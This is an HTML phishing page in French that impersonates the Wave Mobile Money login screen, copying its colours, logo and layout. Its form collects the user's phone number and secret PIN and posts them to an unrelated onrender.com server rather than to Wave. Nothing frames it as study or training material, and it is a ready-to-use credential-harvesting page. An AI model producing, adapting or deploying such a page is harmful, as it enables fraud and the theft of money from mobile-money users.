<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion - Wave Mobile Money</title>

  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #46C5F3; /* Bleu clair Wave */
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background-color: #87D9F8; /* Cadre bleu clair */
      width: 350px;
      padding: 30px;
      border-radius: 18px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
      text-align: center;
    }

    .logo {
      width: 130px;
      margin-bottom: 10px;
    }

    h2 {
      font-size: 22px;
      margin: 0;
      font-weight: bold;
    }

    h3 {
      margin-top: 5px;
      margin-bottom: 25px;
      font-weight: normal;
      color: #003087;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 12px;
      border: 1px solid #d1d1d1;
      font-size: 15px;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      background-color: #003087; /* BLEU OFFICIEL WAVE */
      color: white;
      border: none;
      border-radius: 25px; /* Style arrondi comme Wave */
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #00246a;
    }

    .footer-info {
      margin-top: 20px;
      font-size: 12px;
      color: white;
    }

    .footer-info a {
      color: white;
      text-decoration: none;
      margin: 0 3px;
    }

    .footer-info a:hover {
      text-decoration: underline;
    }
  </style>

</head>
<body>

  <div class="login-box">
    <img src="pingouin.png" class="logo" alt="Logo Wave">

    <h2>Connexion</h2>
    <h3>Wave Mobile Money</h3>

    <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
      <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
      <input type="password" name="pin" placeholder="Code secret" required>
      <button type="submit">Connexion</button>
    </form>

    <div class="footer-info">
      <a href="#">Conditions</a> • 
      <a href="#">Vie privée</a> • 
      <a href="#">Aide</a>
    </div>
  </div>

</body>
</html>
